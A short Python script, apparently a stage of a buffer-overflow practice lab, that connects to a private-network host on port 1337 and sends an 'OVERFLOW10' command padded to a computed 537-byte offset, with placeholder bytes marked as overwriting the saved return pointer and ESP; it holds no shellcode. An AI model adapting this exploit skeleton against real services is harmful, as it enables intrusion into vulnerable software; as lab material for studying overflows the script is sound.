#!/usr/bin/env python3
import socket
RHOST = "192.168.112.135"
RPORT = 1337

buf_length = 1000
prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset

buffer = ""
buffer += prefix
buffer += overflow
buffer += "BBBB"	# overwriting saved return pointer
buffer += "CCCC"	# ESP
buffer += "D" * (buf_length - (len(buffer) - len(prefix))) # trailing padding
buffer += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((RHOST, RPORT))
	print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
	s.send(bytes(buffer, "latin-1"))
	print("[+] Done!")
except:
	print("[-] Unable to establish connection to the target.")
